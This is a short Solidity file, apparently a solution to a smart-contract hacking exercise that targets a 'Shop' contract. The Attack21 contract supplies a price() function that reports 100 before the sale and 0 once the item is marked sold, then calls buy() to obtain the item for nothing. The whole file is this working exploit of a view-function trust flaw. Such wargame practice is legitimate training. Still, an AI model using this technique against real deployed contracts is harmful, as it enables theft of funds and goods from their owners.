// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./21-shop.sol";  

contract Attack21 {
    Shop target;

    constructor(address _targetAddress) {
        target = Shop(_targetAddress);
    }

    function price() external view returns (uint){
        if (target.isSold()) {
            // second iteration - we win!
            return 0;
        } 
        // first iteration
        return 100;
    }

    function attack() public {
        target.buy();
    }
}



